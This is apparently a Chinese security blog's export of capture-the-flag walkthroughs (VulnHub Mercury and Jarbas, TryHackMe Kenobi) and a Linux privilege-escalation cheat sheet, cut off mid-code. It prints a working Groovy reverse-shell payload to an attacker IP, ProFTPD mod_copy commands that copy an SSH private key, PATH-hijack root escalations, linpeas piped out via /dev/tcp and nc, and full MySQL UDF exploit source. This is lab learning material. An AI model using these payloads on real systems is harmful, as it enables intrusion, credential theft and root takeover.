history，没内容。那么我们看看网页目录下有啥，有个notes.txt。查看一下，里面好像存了一个linuxmaster的登录凭证的base64编码。我们cat /etc/passwd确定确实有该用户，那我们echo &#39;bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==&#39; | base64 -d解码一下尝试登录看看能不能成。\nwebmaster@mercury:~/mercury_proj$ su linuxmasterPassword: linuxmaster@mercury:/home/webmaster/mercury_proj$ sudo -l[sudo] password for linuxmaster: Matching Defaults entries for linuxmaster on mercury:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser linuxmaster may run the following commands on mercury:    (root : root) SETENV: /usr/bin/check_syslog.shlinuxmaster@mercury:/home/webmaster/mercury_proj$ cat /usr/bin/check_syslog.sh#!/bin/bashtail -n 10 /var/log/sysloglinuxmaster@mercury:/home/webmaster/mercury_proj$ ls -la /usr/bin/check_syslog.sh-rwxr-xr-x 1 root root 39 Aug 28  2020 /usr/bin/check_syslog.sh\n发现成功登录，查看sudo -l发现此用户可以以root身份无密码运行/usr/bin/check_syslog.sh且有SETENV权限。我们查看check_syslog.sh的内容，发现就是用tail查看下系统日志。值得注意的是，这里的tail是用相对路径而不是绝对路径写的，所以系统执行时从PATH中寻找的。正好此用户有SETENV的权限，那我们的提权思路就很明确了：我们伪造一个tail，并把其位置写在PATH前面，因为系统执行是从前往后寻找的，这样我们就能以root权限执行我们先要执行的命令了。\nlinuxmaster@mercury:/tmp$ echo &#x27;/bin/bash -p&#x27; &gt; taillinuxmaster@mercury:/tmp$ chmod +xs tail linuxmaster@mercury:/tmp$ ls -latotal 48drwxrwxrwt 10 root        root        4096 May 23 17:10 .drwxr-xr-x 19 root        root        4096 Sep  1  2020 ..-rwxr-xr-x  1 linuxmaster linuxmaster   39 May 23 17:05 backupdrwxrwxrwt  2 root        root        4096 May 23 13:14 .font-unixdrwxrwxrwt  2 root        root        4096 May 23 13:14 .ICE-unixdrwx------  3 root        root        4096 May 23 13:14 systemd-private-1295227d0ee948c7b42b8e747d46283d-systemd-logind.service-Pum4tf                                                                                                                    drwx------  3 root        root        4096 May 23 13:14 systemd-private-1295227d0ee948c7b42b8e747d46283d-systemd-resolved.service-OBDWgg                                                                                                                  drwx------  3 root        root        4096 May 23 13:14 systemd-private-1295227d0ee948c7b42b8e747d46283d-systemd-timesyncd.service-mA1HTi                                                                                                                 -rwsrwsr-x  1 linuxmaster linuxmaster   13 May 23 17:10 taildrwxrwxrwt  2 root        root        4096 May 23 13:14 .Test-unixdrwxrwxrwt  2 root        root        4096 May 23 13:14 .X11-unixdrwxrwxrwt  2 root        root        4096 May 23 13:14 .XIM-unixlinuxmaster@mercury:/tmp$ export PATH=/tmp:$PATHlinuxmaster@mercury:/tmp$ echo $PATH/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gameslinuxmaster@mercury:/tmp$ sudo PATH=$PATH /usr/bin/check_syslog.sh root@mercury:/tmp# whoamirootroot@mercury:/tmp# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000    link/ether 08:00:27:80:e5:a9 brd ff:ff:ff:ff:ff:ff    inet 192.168.56.103/24 brd 192.168.56.255 scope global dynamic enp0s3       valid_lft 584sec preferred_lft 584sec    inet6 fe80::a00:27ff:fe80:e5a9/64 scope link        valid_lft forever preferred_lft foreverroot@mercury:/tmp# uname -aLinux mercury 5.4.0-45-generic #49-Ubuntu SMP Wed Aug 26 13:38:52 UTC 2020 x86_64 x86_64 x86_64 GNU/Linuxroot@mercury:/tmp# exitexitlinuxmaster@mercury:/tmp$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh root@mercury:/tmp# iduid=0(root) gid=0(root) groups=0(root)root@mercury:/tmp# cd ~root@mercury:~# ls -latotal 56drwx------  5 root root 4096 Sep  2  2020 .drwxr-xr-x 19 root root 4096 Sep  1  2020 ..-rw-------  1 root root 3214 May 23 17:14 .bash_history-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrcdrwxr-xr-x  3 root root 4096 Aug 27  2020 .cache-rw-------  1 root root   34 Sep  1  2020 .lesshstdrwxr-xr-x  3 root root 4096 Aug 28  2020 .local-rw-------  1 root root 3619 Sep  1  2020 .mysql_history-rw-r--r--  1 root root  161 Dec  5  2019 .profile-rw-------  1 root root 1228 Sep  2  2020 root_flag.txtdrwx------  2 root root 4096 Aug 27  2020 .ssh-rw-------  1 root root 9454 Sep  2  2020 .viminforoot@mercury:~# cat root_flag.txt @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(((/(*(/((((((////////&amp;@@@@@@@@@@@@@@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@@@@@@@*((####((///*//(///*(/*//((/(((//**/((&amp;@@@@@@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Congratulations on completing Mercury!!!If you have any feedback please contact me at SirFlash@protonmail.com[root_flag_69426d9fda579afbffd9c2d47ca31d90]root@mercury:~#\n从上面的操作，我们可以看出对于SETENV权限，我们可以通过sudo PATH=$PATH /usr/bin/check_syslog.sh 或sudo --preserve-env=PATH /usr/bin/check_syslog.sh两种方式强制以当前用户PATH执行。\n","categories":["vulnhub"],"tags":["walkthrough"]},{"title":"[vulnhub]  jarbas","url":"/2023/05/24/jarbas/","content":"\n\n\n信息收集nmap扫描\nnmap -sn主机发现\n┌──(kali㉿kali)-[~]└─$ nmap -sn 192.168.56.0/24map 7.93 ( https://nmap.org ) at 2023-04-15 04:27 EDTNmap scan report for 192.168.56.2Host is up (0.00062s latency).Nmap scan report for 192.168.56.132Host is up (0.0013s latency).Nmap scan report for 192.168.56.134Host is up (0.0031s latency).Nmap done: 256 IP addresses (3 hosts up) scanned in 2.57 seconds\n\n目标发现：192.168.56.134\n\nnmap -p- --min-rate=10000端口扫描\n┌──(kali㉿kali)-[~]└─$ sudo nmap -p- --min-rate=10000 192.168.56.134Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 04:30 EDTNmap scan report for 192.168.56.134Host is up (0.00087s latency).Not shown: 65531 closed tcp ports (conn-refused)PORT     STATE SERVICE22/tcp   open  ssh80/tcp   open  http3306/tcp open  mysql8080/tcp open  http-proxyNmap done: 1 IP address (1 host up) scanned in 3.42 seconds\n\n22，80，3306，8080端口开放。\n\nTCP扫描，服务检测，操作系统识别\n┌──(kali㉿kali)-[~]└─$ sudo nmap -sT -sV -O -p22,80,3306,8080 192.168.56.134[sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 04:31 EDTNmap scan report for 192.168.56.134Host is up (0.00062s latency).PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)3306/tcp open  mysql   MariaDB (unauthorized)8080/tcp open  http    Jetty 9.4.z-SNAPSHOTMAC Address: 00:0C:29:D4:0A:9B (VMware)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.48 seconds\n\n看起来80和8080好下手，且8080开放的服务版本也识别出来了：Jetty 9.4.z-SNAPSHOT。\n\n漏洞扫描\n┌──(kali㉿kali)-[~]└─$ sudo nmap --script=vuln -p22,80,3306,8080 192.168.56.134Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 04:36 EDTNmap scan report for 192.168.56.134Host is up (0.00062s latency).PORT     STATE SERVICE22/tcp   open  ssh80/tcp   open  http| http-enum: |_  /icons/: Potentially interesting folder w/ directory listing|_http-trace: TRACE is enabled|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.3306/tcp open  mysql8080/tcp open  http-proxy| http-enum: |_  /robots.txt: Robots fileMAC Address: 00:0C:29:D4:0A:9B (VMware)Nmap done: 1 IP address (1 host up) scanned in 35.09 seconds\n\n可以看看8080的robots.txt文件，其他没啥有用信息。\n\n\n80与8080端口\n先浏览器访问192.168.56.134以及192.168.56.134:8080。\n\n80端口运行着一个奇奇怪怪的网页，有个登录框，随便尝试登录发现跳转不正常，会失败。点击网页其他的连接地址也会错误跳转。单从网页上没啥有用信息。\n\n看看8080吧家人们。发现是个Jenkins的后台登录页面，网页底部还写了jenkins版本是2.1.13，直接searchsploir没找到有用exp。先放着。同时，8080运行的Jetty版本也有了，一起搜一搜，还是没啥能用的漏洞。\n\n回旋！没啥有用信息，先试试网页目录发现。\n\n直接上feroxbuster\n#### content discovery```bash┌──(kali㉿kali)-[~]└─$ sudo feroxbuster -u http://192.168.56.134 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,301,302,401  ___  ___  __   __     __      __         __   ___|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___by Ben &quot;epi&quot; Risher 🤓                 ver: 2.9.1───────────────────────────┬────────────────────── 🎯  Target Url            │ http://192.168.56.134 🚀  Threads               │ 50 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌  Status Codes          │ [200, 301, 302, 401] 💥  Timeout (secs)        │ 7 🦡  User-Agent            │ feroxbuster/2.9.1 💉  Config File           │ /etc/feroxbuster/ferox-config.toml 🏁  HTTP methods          │ [GET] 🔃  Recursion Depth       │ 4 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest───────────────────────────┴────────────────────── 🏁  Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────200      GET      404l     1784w    32906c http://192.168.56.134/[####################] - 33s   220546/220546  0s      found:1       errors:0      [####################] - 32s   220546/220546  6798/s  http://192.168.56.134/ ```\n\n什么也没找到，奇了怪了，事出反常必有妖。在网页点击几个链接，发现使用php写的，尝试指定文件后缀重新发现。\n-x php,html\n┌──(kali㉿kali)-[~]└─$ sudo feroxbuster -u http://192.168.56.134 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -s 200,301,302,401  ___  ___  __   __     __      __         __   ___|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___by Ben &quot;epi&quot; Risher 🤓                 ver: 2.9.1───────────────────────────┬────────────────────── 🎯  Target Url            │ http://192.168.56.134 🚀  Threads               │ 50 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌  Status Codes          │ [200, 301, 302, 401] 💥  Timeout (secs)        │ 7 🦡  User-Agent            │ feroxbuster/2.9.1 💉  Config File           │ /etc/feroxbuster/ferox-config.toml 💲  Extensions            │ [php, html] 🏁  HTTP methods          │ [GET] 🔃  Recursion Depth       │ 4 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest───────────────────────────┴────────────────────── 🏁  Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────200      GET      404l     1784w    32906c http://192.168.56.134/200      GET      404l     1784w    32906c http://192.168.56.134/index.html200      GET       13l       28w      359c http://192.168.56.134/access.html[####################] - 1m    661638/661638  0s      found:3       errors:0      [####################] - 1m    661638/661638  6456/s  http://192.168.56.134/\n\n访问access.html，发现了加密的登录凭证。\n# http://192.168.56.134/access.htmlCreds encrypted in a safe way!tiago:5978a63b4654c73c60fa24f836386d87trindade:f463f63616cb3f1e81ce46b39f882fd5-----mariannaeder:9b38e2b1e8b12f426b0d208a7ab6cb98-----vipsu# hash-indentify 发现最可能是md5加密# 使用crackstation解密，发现是LM类型加密tiago:italia99trindade:mariannaeder:vipsu\n\n另说一句，目录发现8080端口能发现一些文件夹，但是无效信息，没用。\n\n根据以上获得的登录凭证，尝试ssh登录，全都失败，再尝试登录jenkins后台，发现eder:vipsu可以成功进入后台。\n\n\n漏洞利用\njenkins一眼存在错误配置导致的RCE漏洞。进入/script页面，从PayloadAllTheThing上搜一搜groovy script的reverse shell payload。填入框中点击run。\n// Groovy script payloadString host=&quot;192.168.56.132&quot;;int port=4444;String cmd=&quot;/bin/bash&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();\n\n\n\n\n\n成功拿到jenkins的shell。\n\n\n提权\n遇事不决sudo -l，要密码，歇逼。\n\n看看SUID，find / -type f -perm -04000 -ls 2&gt;/dev/null,没啥有用的。\n\n三板斧之cronjob，看看crontab。\n\n发现/etc/script下有个CleaningScript.sh命令脚本，*/5说明其每5分钟运行一次。\nls -la发现其权限竟然是777且所有者是root。完美，我们向里面写入我们的reverse shel。\n\n\n在本机使用nc监听，到整数5分钟时。接收到了root shell。\n\n\n看看flag\n\n\n\n","categories":["vulnhub"],"tags":["walkthrough"]},{"title":"[THM]  kenobi","url":"/2023/05/24/kenobi/","content":"\n\n\n信息收集\nnmap -sC -sV -T4 ip\n┌──(root㉿kali)-[~]└─# nmap -sC -sV -T4 10.10.87.203Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 11:36 UTCNmap scan report for ip-10-10-87-203.eu-west-1.compute.internal (10.10.87.203)Host is up (0.0029s latency).Not shown: 993 closed tcp ports (reset)PORT     STATE SERVICE     VERSION21/tcp   open  ftp         ProFTPD 1.3.522/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 b3ad834149e95d168d3b0f057be2c0ae (RSA)|   256 f8277d642997e6f865546522f7c81d8a (ECDSA)|_  256 5a06edebb6567e4c01ddeabcbafa3379 (ED25519)80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)| http-robots.txt: 1 disallowed entry |_/admin.html|_http-title: Site doesnt have a title (text/html).111/tcp  open  rpcbind     2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100003  2,3,4       2049/tcp   nfs|   100003  2,3,4       2049/tcp6  nfs|   100003  2,3,4       2049/udp   nfs|   100003  2,3,4       2049/udp6  nfs|   100005  1,2,3      39028/udp   mountd|   100005  1,2,3      51006/udp6  mountd|   100005  1,2,3      52219/tcp   mountd|   100005  1,2,3      53459/tcp6  mountd|   100021  1,3,4      34773/tcp6  nlockmgr|   100021  1,3,4      37630/udp6  nlockmgr|   100021  1,3,4      39473/tcp   nlockmgr|   100021  1,3,4      41668/udp   nlockmgr|   100227  2,3         2049/tcp   nfs_acl|   100227  2,3         2049/tcp6  nfs_acl|   100227  2,3         2049/udp   nfs_acl|_  100227  2,3         2049/udp6  nfs_acl139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)2049/tcp open  nfs_acl     2-3 (RPC #100227)MAC Address: 02:52:93:89:63:6F (Unknown)Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s| smb2-security-mode: |   311: |_    Message signing enabled but not required| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-time: |   date: 2023-04-10T11:36:30|_  start_date: N/A|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: kenobi|   NetBIOS computer name: KENOBI\\x00|   Domain name: \\x00|   FQDN: kenobi|_  System time: 2023-04-10T06:36:30-05:00Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.48 seconds\n\n\n21端口，ftp服务开放，且使用的是ProFTPD，version是1.3.5。\n\n80端口开放，有网页服务器，访问网页没有任何有用信息。admin.html屁用没有（\n\n111端口开放，rpc服务开启。\n\n139和445端口开放，Samba服务开启。\n\nSamba是适用于Linux和Unix的标准Windows互操作性程序套件。它允许最终用户访问和使用公司内部网或互联网上的文件、打印机和其他常见共享资源。它通常被称为网络文件系统。Samba基于服务器消息块（SMB）的通用客户端/服务器协议。SMB仅针对Windows开发，如果没有Samba，其他计算机平台将与Windows机器隔离，即使它们是同一网络的一部分。\n\n\n因为上面扫描发现存在smb服务，所以使用nmap脚本smb-enum-shares.nse以及smb-enum-users.nse对靶机smb的shares以及users进行列举。\n​\t\t\n可以发现\\IPC$以及\\anonymous都可以任意读写以及访问。\n\n所以，我们使用smbclient //ip/anonymous匿名连接靶机smb共享，查看发现存在log.txt文件。（&#x2F;&#x2F;ip&#x2F;IPC$啥也没有）\n​\t\n我们从log.txt中，我们可以发现用户生成了自己的ssh私钥放在/home/kenobi/.ssh/目录下的id_rsa文件中。于是我们考虑能否拿到该秘钥以通过ssh登录靶机。\n\n于是，我们得想办法拿到秘钥。之前扫描发现的111端口开放且正在运行rpcbind服务，rpcbind是一个将远程程序调用(RPC– remote procedure call)的程序号转换为通用地址的服务器。当一个RPC 服务启动时，它会告诉 rpcbind 它正在监听的地址以及它准备启用的服务所对应的RPC程序编号。因为扫描发现nfs（network file system）服务被远程启用，我们进一步使用nmap脚本nfs-ls, nfs-statfs, nfs-showmount尝试枚举nfs信息。\n\n我们可以发现，靶机将&#x2F;var挂载在nfs上。我们可以尝试将这个目录挂载在我们的攻击机上。\n\n\n漏洞利用\n但是我们想要的秘钥不在&#x2F;var目录下，我们首先要将其弄到&#x2F;var目录中。前面发现了ProFTPD的版本是1.3.5，我们searchsploit proFTPD 1.3.5 发现其存在文件拷贝漏洞。（其他两个’mod_copy’ RCE利用不成功）。查看File Copy的漏洞利用.txt文件，发现漏洞细节。\n\n该版本ProFtpd的mod_copy模块中存在漏洞。mod_copy模块实现了SITE CPFR 和 SITE CPTO 命令(类似于 RNFR 和 RNTO) ，这些命令可以用来将文件&#x2F;目录从服务器上的一个地方复制到另一个地方，而无需将数据传输到客户端并等待返回（无身份验证），该模块包含在 ProFTPD 1.3.x 的 mod_copy.c 文件中，默认情况下不进行编译。也就是说：任何未经身份验证的客户机都可以利用SITE CPFR 和 SITE CPTO 命令，将文件从FTP服务器的文件系统的任何位置复制到选定的位置。刚好是我们需要的功能。\n\n我们使用nc连接ftp服务器，并利用该漏洞将id_rsa拷贝到&#x2F;var&#x2F;tmp目录下。\nnc -nv 10.10.87.203 21SITE CPFR /home/kenobi/.ssh/id_rsaSITE CPTO /vat/tmp/id_rsa\n\n我们将&#x2F;var挂载(mount)到我们机子上\n​\t\n可以发现，我们已经获得了ssh登录的rsa私钥。\n\n我们将id_rsa文件权限改成600，否则无法用于ssh登录。\n\n成功登录并可以看到user.txt。\n\n\n提权\n先把lse.sh传上去再说。运行。（或者使用find / -perm -u=s -type f 2&gt;/dev/null查找有SUID位的二进制文件）\n\n发现有趣的setuid二进制文件：&#x2F;usr&#x2F;bin&#x2F;menu。\n\n我们用string检查一下这个二进制文件。（strings 是 Linux 上的一个命令，它能在二进制文件上查找人类可读的字符串，我们使用以下命令来查看&#x2F;usr&#x2F;bin&#x2F;menu运行时的信息（因为执行menu命令时有文字回显，我们才使用strings命令））\n\n我们发现，其调用curl,uname,ifconfig使用的不是绝对路径（/usr/bin/curl）这种。所以系统在执行时会从$PATH下的路径从前到后寻找这些二进制文件。\n\n所以我们可以在$PATH最前面加入目录，并放入我们构造的这些二进制文件，然后menu运行时就会以root权限执行这些文件。因此我们直接构造/bin/bash。\n# 在/home/kenobi目录下kenobi@kenobi:~$ echo /bin/bash &gt; ifconfigkenobi@kenobi:~$ chmod 777 ifconfig\n\n​\t\n成功提权。\n\n\n","categories":["TryHackMe"],"tags":["walkthrough"]},{"title":"Privilege Escalation","url":"/2023/05/24/pe_note/","content":"\n\n\nPrivilege Escalation整理自B站up红队笔记的提权精讲\nLinux Priv Esca最常用：\n\nugo\nsuid sgid\nCapabilities\nAppArmor Selinux\nACL\n\n用的也比较多的：\n\nGrsecurity\n\nPax\n\nExecShield\n\nASLR\n\nTOMOYO Linux\n\nSMACK\n\nYama\n\nCGroups\n\nLinux Namespaces\n\nStackGuard\n\nProplice\n\nseccomp\n\nPtrace\n\ncapsicum\n\nMprotect\n\nchroot\n\nfirejail\n\n\n手动枚举用户信息：\n\nwhoami\nid\nw&#x2F;who 查看其他登录用户\nlast 最近登录用户以及一些操作\n\n内核版本信息：\n\nuname -a\nlsb_release -a 更多信息\ncat &#x2F;proc&#x2F;version 进程信息查看版本\ncat &#x2F;etc&#x2F;issue\nhostnamectl\n\n网络信息：\n\nip a\nifconfig 老机子\nip route 查看路由表信息\nip neigh 查看网络邻居\narp -a\n\n用户权限：\n\nsudo -l\ngetcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null\nhistory 查看历史命令\ncat &#x2F;etc&#x2F;passwd\ncat cat &#x2F;etc&#x2F;shadow\ncat &#x2F;etc&#x2F;crontab\necho $PATH\nenv 查看整体环境\nps -ef  entire full list\nps axjf  x-没有连接到终端的进程 j-查看进程树 a-all\nps aux u-显示启动进程的用户\ntop 查看实时更新的进程信息 top -n 1 只刷一次\nnetstat -a \nnetstat -l 显示正在监听的\nfind &#x2F; -type f -perm -04000 2&gt;&#x2F;dev&#x2F;null  或者（find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null）\nwhich 查询可执行文件\ncat &#x2F;etc&#x2F;fstab 查看未挂载磁盘（系统运维备份常临时挂载一块磁盘，当使用时再挂载，不使用时就卸掉）\n\n自动枚举\n大招：linpeas \n\n推荐：curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh  通过管道符执行，不保留文件到本地。\n将扫描结果传回本地查看 curl &lt;serverIP&gt;/linpeas.sh | sh | nc &lt;kaliIP&gt; &lt;port&gt;  kali: nc -lvnp &lt;port&gt; | tee name.txt tee 既又在标准输出中显示，又保存到txt文件中。txt文件可以用less -r 查看。\n靶机没有curl。kali：sudo nc -lvnp &lt;port&gt; &lt; linpeas.sh victim:cat &lt; /dev/tcp/&lt;kaliIP&gt;/&lt;port&gt; | sh \n\n\nlinEnum\n\nLSE\n\nLES\n\nlinuxprivchecker.py\n\nunix-privsec-check\n\n\nTrickshell的稳定python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;stty raw -echo #raw 格式输出并关闭echo导致的命令显示两次export TERM=xterm-color\n\nrlwrap nc -lvnp 443用readlinewrap将我们的反弹shell包裹起来，防止上下翻历史记录时出现问题。\n常用方法bash version\nver&lt;4.2存在漏洞可以利用：可以在bash中定义函数并用路径组合做文件名。\nver&lt;4.4存在漏洞可以利用：环境变量插入。\n\nMySQL udfMySQL user defined function.\n提权条件\n有mysql账号，且有增删改查权限。最好有mysql root账号。\n\nsecure_file_priv 最好要为空，或者其指定目录能够利用。（该属性限定Load data、select into outfile、load_file()等操作）。（通过show variables like &#39;%secure_file_priv%&#39;查看）\n\n\n利用主要操作：写入’plugin’中。（show variables like &#39;%plugin%&#39;查到的目录）\n其他步骤在exp中有。\n/* * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $ * * raptor_udf2.c - dynamic library for do_system() MySQL UDF * Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt; * * This is an helper dynamic library for local privilege escalation through * MySQL run with root privileges (very bad idea!), slightly modified to work  * with newer versions of the open-source database. Tested on MySQL 4.1.14. * * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c * * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes * for the security vulnerabilities in the handling of User Defined Functions * (UDFs) reported by Stefano Di Paola &lt;stefano.dipaola@wisec.it&gt;. For further * details, please refer to: * * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html * http://www.wisec.it/vulns.php?page=4 * http://www.wisec.it/vulns.php?page=5 * http://www.wisec.it/vulns.php?page=6 * * &quot;UDFs should have at least one symbol defined in addition to the xxx symbol  * that corresponds to the main xxx() function. These auxiliary symbols  * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and  * xxx_add() functions&quot;. -- User Defined Functions Security Precautions  * * Usage: * $ id * uid=500(raptor) gid=500(raptor) groups=500(raptor) * $ gcc -g -c raptor_udf2.c * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc * $ mysql -u root -p * Enter password: * [...] * mysql&gt; use mysql; * mysql&gt; create table foo(line blob); * mysql&gt; insert into foo values(load_file(&#x27;/home/raptor/raptor_udf2.so&#x27;)); * mysql&gt; select * from foo into dumpfile &#x27;/usr/lib/raptor_udf2.so&#x27;; * mysql&gt; create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;; * mysql&gt; select * from mysql.func; * +-----------+-----+----------------+----------+ * | name      | ret | dl             | type     | * +-----------+-----+----------------+----------+ * | do_system |   2 | raptor_udf2.so | function | * +-----------+-----+----------------+----------+ * mysql&gt; select do_system(&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;); * mysql&gt; \\! sh * sh-2.05b$ cat /tmp/out * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm) * [...] * * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys * */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;enum Item_result &#123;STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT&#125;;typedef struct st_udf_args &#123;\tunsigned int\t\targ_count;\t// number of arguments\tenum Item_result\t*arg_type;\t// pointer to item_result\tchar \t\t\t**args;\t\t// pointer to arguments\tunsigned long\t\t*lengths;\t// length of string args\tchar\t\t\t*maybe_null;\t// 1 for maybe_null args&#125; UDF_ARGS;typedef struct st_udf_init &#123;\tchar\t\t\tmaybe_null;\t// 1 if func can return NULL\tunsigned int\t\tdecimals;\t// for real functions\tunsigned long \t\tmax_length;\t// for string functions\tchar\t\t\t*ptr;\t\t// free ptr for func data\tchar\t\t\tconst_item;\t// 0 if result is constant&#125; UDF_INIT;int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)&#123;\tif (args-&gt;arg_count != 1)\t\treturn(0);\tsystem(args-&gt;args[0]);\treturn(0);&#125;char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)&#123;\treturn(0);&#125;// milw0rm.com [2006-02-20]\n\n&#x2F;etc&#x2F;shadow什么时候用：手动枚举发现可读写，历史命令发现当前账号进行过操作。\n\n可读：用john破解\n可写：直接写入(使用mkpasswd -m sha-512 生成对应格式的hash值填入)\n\n&#x2F;etc&#x2F;passwd可写：openssl passwd &lt;passwd&gt;\nsudo 环境变量提权sudo -l发现存在环境变量env_keep+=LD_PRELOADS(LD&#x3D;link dynamic动态链接库)\n/* shell.c /* /* -fPIC place indepedent code/* 还需要以root权限执行一个命令（随便）随后就能在命令执行前预先执行动态链接库生成新/* 的root bash实现提权/* gcc -fPIC -shared -o shell.so shell.c -nostartfiles/* sudo LD_PRELOAD=/tmp/shell.so &lt;rootcommand&gt;*/#include &lt;stdio.h&gt;#include 